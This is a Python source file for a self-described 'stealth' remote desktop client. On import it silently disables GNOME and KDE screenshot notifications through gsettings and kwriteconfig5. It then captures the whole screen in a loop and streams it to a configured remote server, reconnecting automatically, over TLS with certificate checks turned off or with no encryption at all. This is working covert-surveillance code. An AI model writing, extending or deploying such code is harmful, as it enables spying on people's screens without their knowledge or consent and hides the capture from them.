"""
Remote Desktop Viewer Client
Stealth background service for screen capture and streaming
"""
import asyncio
import ssl
import socket
import argparse
import sys
import logging
from pathlib import Path
import signal
from typing import Optional
import configparser
import os
import platform
import subprocess

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

def suppress_screenshot_notifications():
    """Suppress screenshot sharing alerts on Linux desktop environments"""
    if platform.system() != "Linux":
        return
    
    # Suppress GNOME/KDE screenshot notifications via environment variables
    # These variables prevent desktop environment notification popups
    env_vars = {
        'NO_AT_BRIDGE': '1',  # Disable accessibility bridge (reduces notifications)
        'QT_ACCESSIBILITY': '0',  # Disable Qt accessibility (KDE)
        'GTK_MODULES': '',  # Disable GTK modules that might show notifications
    }
    
    for key, value in env_vars.items():
        if key not in os.environ:
            os.environ[key] = value
    
    # Try to disable GNOME screenshot notifications via gsettings (non-blocking)
    try:
        # Check if gsettings is available
        subprocess.run(
            ['gsettings', 'set', 'org.gnome.desktop.notifications.application:org.gnome.Screenshot', 
             'enable', 'false'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=1,
            check=False
        )
    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
        # gsettings not available or failed - continue silently
        pass
    
    # Try to disable KDE Spectacle notifications (non-blocking)
    try:
        # Disable Spectacle notifications via kwriteconfig5 or system settings
        subprocess.run(
            ['kwriteconfig5', '--file', 'spectaclerc', '--group', 'General', 
             '--key', 'PlayNotificationSound', 'false'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=1,
            check=False
        )
    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
        # KDE tools not available - continue silently
        pass

# Suppress notifications at module load time
suppress_screenshot_notifications()

from config import (
    DEFAULT_CLIENT_PORT, CLIENT_CERT, CLIENT_KEY, CA_CERT, SERVER_CERT,
    CAPTURE_FPS, ENABLE_DELTA_UPDATES, DELTA_THRESHOLD, CLIENT_LOG,
    SCREEN_QUALITY, CAPTURE_ALL_DISPLAYS
)
from common.screen_capture import ScreenCapture
from common.protocol import FrameEncoder, ProtocolHandler

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,  # Changed to DEBUG for better diagnostics
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CLIENT_LOG),
        logging.StreamHandler(sys.stderr)  # Only stderr, no stdout to stay stealth
    ]
)
logger = logging.getLogger(__name__)

class RemoteDesktopClient:
    """Client for streaming desktop to server"""
    
    def __init__(self, server_host: str, server_port: int = DEFAULT_CLIENT_PORT):
        self.server_host = server_host
        self.server_port = server_port
        self.reader = None
        self.writer = None
        self.capture = None
        self.running = False
        self.reconnect_delay = 5
        
    def create_ssl_context(self) -> Optional[ssl.SSLContext]:
        """Create SSL context for secure connection"""
        # Check certificate existence
        has_server_cert = SERVER_CERT.exists()
        has_ca_cert = CA_CERT.exists()
        
        logger.info(f"Client certificate check: SERVER_CERT={has_server_cert}, CA_CERT={has_ca_cert}")
        
        # If certificates don't exist, return None (unencrypted for testing)
        if not has_server_cert and not has_ca_cert:
            logger.warning("Certificates not found. Using unencrypted connection (testing only).")
            print("Client: Using unencrypted connection (no certificates)")
            return None
        
        # Certificates exist - create SSL context
        logger.info("Client: Using SSL/TLS connection (certificates found)")
        print("Client: Using SSL/TLS connection (certificates found)")
        
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False  # For self-signed certs
        context.verify_mode = ssl.CERT_NONE  # In production, use proper CA
        
        # Load client certificate if available
        if CLIENT_CERT.exists() and CLIENT_KEY.exists():
            context.load_cert_chain(str(CLIENT_CERT), str(CLIENT_KEY))
        
        # Load CA certificate if available
        if CA_CERT.exists():
            context.load_verify_locations(str(CA_CERT))
        
        return context
    
    async def connect(self) -> bool:
        """Establish secure connection to server"""
        try:
            ssl_context = self.create_ssl_context()
            ssl_mode = "SSL/TLS" if ssl_context else "UNENCRYPTED"
            
            logger.info(f"Connecting to {self.server_host}:{self.server_port} ({ssl_mode})")
            print(f"Connecting to {self.server_host}:{self.server_port} ({ssl_mode})")
            
            self.reader, self.writer = await asyncio.open_connection(
                self.server_host,
                self.server_port,
                ssl=ssl_context if ssl_context else None
            )
            
            logger.info(f"Connected to server ({ssl_mode})")
            print(f"Connected to server ({ssl_mode})")
            return True
            
        except Exception as e:
            logger.error(f"Connection failed: {type(e).__name__}: {e}")
            print(f"Connection failed: {type(e).__name__}: {e}")
            import traceback
            logger.error(f"Traceback: {traceback.format_exc()}")
            return False
    
    async def send_frame(self, frame_data: bytes, frame_id: int, 
                        is_delta: bool = False, x: int = 0, y: int = 0,
                        width: int = 0, height: int = 0):
        """Send a frame to the server"""
        if not self.writer:
            return
        
        try:
            # Validate frame data
            if not frame_data or len(frame_data) == 0:
                logger.warning("Attempted to send empty frame data")
                return
            
            encoded = FrameEncoder.encode_frame(
                frame_data, frame_id, is_delta, x, y, width, height
            )
            
            if not encoded or len(encoded) == 0:
                logger.warning("Encoded frame is empty")
                return
            
            # Send frame length first, then frame data
            length_bytes = len(encoded).to_bytes(4, 'big')
            
            # Debug: Log frame size for troubleshooting
            logger.debug(f"Sending frame {frame_id}: length_prefix={len(encoded)} bytes (hex: {length_bytes.hex()}), original_frame={len(frame_data)} bytes")
            
            # Verify length bytes are valid
            if len(encoded) > 50 * 1024 * 1024:
                logger.error(f"Encoded frame is too large: {len(encoded)} bytes! This should not happen.")
                logger.error(f"Original frame: {len(frame_data)} bytes, is_delta={is_delta}")
                return
            
            # Write both in one operation to ensure atomicity
            try:
                self.writer.write(length_bytes + encoded)
                await self.writer.drain()
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError) as e:
                logger.warning(f"Connection lost while sending frame {frame_id}: {e}")
                self.writer = None
                raise
            
            # Verify connection is still open
            if self.writer.is_closing():
                logger.warning("Writer is closing after send_frame")
                self.writer = None
                raise ConnectionResetError("Connection closed by server")
            
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
            logger.warning(f"Connection lost while sending frame: {conn_err}")
            self.writer = None
            raise
        except Exception as e:
            logger.error(f"Error sending frame: {type(e).__name__}: {e}")
            raise
    
    async def send_heartbeat(self):
        """Send heartbeat to keep connection alive"""
        if not self.writer:
            return
        
        try:
            heartbeat = ProtocolHandler.create_heartbeat()
            self.writer.write(len(heartbeat).to_bytes(4, 'big'))
            self.writer.write(heartbeat)
            await self.writer.drain()
        except Exception as e:
            logger.error(f"Error sending heartbeat: {e}")
            raise
    
    async def handle_messages(self):
        """Handle incoming messages from server"""
        if not self.reader:
            return
        
        try:
            while self.running:
                try:
                    # Read message length
                    length_bytes = await self.reader.readexactly(4)
                    if not length_bytes or len(length_bytes) != 4:
                        logger.debug("Server closed connection (no length bytes)")
                        break
                    
                    length = int.from_bytes(length_bytes, 'big')
                    
                    if length <= 0 or length > 1024 * 1024:  # Max 1MB for config messages
                        logger.warning(f"Invalid message length from server: {length}")
                        break
                    
                    # Read message data
                    data = await self.reader.readexactly(length)
                    
                    # Handle configuration updates, etc.
                    # For now, just acknowledge
                    
                except asyncio.IncompleteReadError:
                    logger.info("Connection closed by server")
                    break
                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
                    logger.info(f"Connection lost: {conn_err}")
                    break
                except Exception as e:
                    logger.error(f"Error handling messages: {type(e).__name__}: {e}")
                    # Continue to try reading next message
                    continue
                    
        except asyncio.IncompleteReadError:
            logger.info("Connection closed by server")
        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
            logger.info(f"Connection lost: {conn_err}")
        except Exception as e:
            logger.error(f"Error in message handler: {type(e).__name__}: {e}")
    
    async def capture_loop(self):
        """Main capture and streaming loop"""
        frame_interval = 1.0 / CAPTURE_FPS
        delta_failures = 0
        max_delta_failures = 5  # After 5 failures, fallback to full screen
        
        try:
            while self.running:
                start_time = asyncio.get_event_loop().time()
                
                try:
                    # Temporarily disable delta updates to avoid region validation issues
                    # Set to False to re-enable delta updates after fixing
                    use_full_screen = True
                    
                    if not use_full_screen and ENABLE_DELTA_UPDATES and delta_failures < max_delta_failures:
                        delta = self.capture.capture_delta(DELTA_THRESHOLD)
                        if delta:
                            frame_data, x, y, width, height = delta
                            frame_id = self.capture.get_frame_id()
                            await self.send_frame(frame_data, frame_id, True, x, y, width, height)
                            delta_failures = 0  # Reset on success
                        # If delta is None, no changes detected - skip frame
                    else:
                        # Fallback to full screen capture
                        if delta_failures >= max_delta_failures:
                            logger.warning("Delta capture failed multiple times, using full screen capture")
                        frame_data = self.capture.capture_full_screen()
                        frame_id = self.capture.get_frame_id()
                        await self.send_frame(frame_data, frame_id)
                        delta_failures = 0  # Reset on success
                        
                except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
                    # Connection lost - will be handled by outer loop
                    logger.warning(f"Connection lost during capture: {conn_err}")
                    self.writer = None
                    raise
                except Exception as capture_error:
                    delta_failures += 1
                    if delta_failures < max_delta_failures:
                        logger.warning(f"Capture error (attempt {delta_failures}/{max_delta_failures}): {capture_error}")
                        # Try full screen as fallback
                        try:
                            frame_data = self.capture.capture_full_screen()
                            frame_id = self.capture.get_frame_id()
                            await self.send_frame(frame_data, frame_id)
                            delta_failures = 0
                        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as conn_err:
                            logger.warning(f"Connection lost during fallback: {conn_err}")
                            self.writer = None
                            raise
                        except Exception as fallback_error:
                            logger.error(f"Full screen capture also failed: {fallback_error}")
                            raise
                    else:
                        # Too many failures, re-raise
                        raise
                
                # Calculate sleep time to maintain FPS
                elapsed = asyncio.get_event_loop().time() - start_time
                sleep_time = max(0, frame_interval - elapsed)
                await asyncio.sleep(sleep_time)
                
        except Exception as e:
            import traceback
            error_msg = str(e) if e else repr(e)
            logger.error(f"Error in capture loop: {type(e).__name__}: {error_msg}")
            logger.error(f"Full traceback:\n{traceback.format_exc()}")
            raise
    
    async def run(self):
        """Main client loop with reconnection logic"""
        self.capture = ScreenCapture(monitor=None, quality=SCREEN_QUALITY, capture_all=CAPTURE_ALL_DISPLAYS)
        logger.info("Screen capture initialized")
        if CAPTURE_ALL_DISPLAYS:
            logger.info(f"Capturing all displays: {self.capture.width}x{self.capture.height}")
        else:
            logger.info(f"Capturing primary monitor: {self.capture.width}x{self.capture.height}")
        
        while True:
            try:
                if await self.connect():
                    self.running = True
                    
                    # Small delay to ensure connection is fully established
                    await asyncio.sleep(0.1)
                    
                    # Start message handler
                    message_task = asyncio.create_task(self.handle_messages())
                    
                    # Start capture loop
                    try:
                        await self.capture_loop()
                    except Exception as e:
                        logger.error(f"Capture loop error: {e}")
                    
                    # Cleanup
                    self.running = False
                    message_task.cancel()
                    
                    if self.writer:
                        self.writer.close()
                        await self.writer.wait_closed()
                
                # Reconnect after delay
                logger.info(f"Reconnecting in {self.reconnect_delay} seconds...")
                await asyncio.sleep(self.reconnect_delay)
                
            except KeyboardInterrupt:
                logger.info("Shutting down...")
                break
            except Exception as e:
                logger.error(f"Unexpected error: {e}")
                await asyncio.sleep(self.reconnect_delay)

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Remote Desktop Viewer Client')
    parser.add_argument('--server-host', help='Server hostname or IP (overrides config/env)')
    parser.add_argument('--server-port', type=int, help='Server port (overrides config/env)')
    
    args = parser.parse_args()
    
    # Try to get server host/port from various sources (in order of priority)
    server_host = None
    server_port = DEFAULT_CLIENT_PORT
    
    # Priority 1: Command-line arguments
    if args.server_host:
        server_host = args.server_host
    if args.server_port:
        server_port = args.server_port
    
    # Priority 2: Environment variables
    if not server_host:
        server_host = os.getenv('RDS_SERVER_HOST')
    if not args.server_port:
        env_port = os.getenv('RDS_SERVER_PORT')
        if env_port:
            try:
                server_port = int(env_port)
            except ValueError:
                pass
    
    # Priority 3: Configuration file
    if not server_host:
        config_file = Path(__file__).parent.parent / 'client_config.ini'
        if not config_file.exists():
            # Also check in current directory (for executables)
            config_file = Path('client_config.ini')
        
        if config_file.exists():
            try:
                config = configparser.ConfigParser()
                config.read(config_file)
                if 'Server' in config:
                    if not server_host:
                        server_host = config['Server'].get('host')
                    if not args.server_port:
                        port_str = config['Server'].get('port')
                        if port_str:
                            try:
                                server_port = int(port_str)
                            except ValueError:
                                pass
            except Exception as e:
                logger.warning(f"Failed to read config file: {e}")
    
    # Final fallback: require server-host
    if not server_host:
        parser.error("Server host is required. Provide --server-host, set RDS_SERVER_HOST environment variable, or create client_config.ini with [Server] host = <IP>")
    
    args.server_host = server_host
    args.server_port = server_port
    
    # Setup signal handlers for graceful shutdown
    def signal_handler(sig, frame):
        logger.info("Received shutdown signal")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Run client
    client = RemoteDesktopClient(args.server_host, args.server_port)
    
    try:
        asyncio.run(client.run())
    except KeyboardInterrupt:
        logger.info("Client stopped")

if __name__ == "__main__":
    main()
